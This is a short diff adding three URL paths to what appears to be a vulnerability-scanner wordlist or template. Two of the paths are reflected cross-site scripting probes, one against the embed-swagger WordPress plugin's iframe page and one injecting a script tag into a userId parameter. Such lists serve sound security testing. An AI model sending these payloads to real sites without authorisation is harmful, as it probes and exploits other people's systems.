@@ -1,0 +1,3 @@
+/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22
+/wp-content/themes/swagger/style.css
+/dochelper?userId=<script>alert({{randstr}})</script>
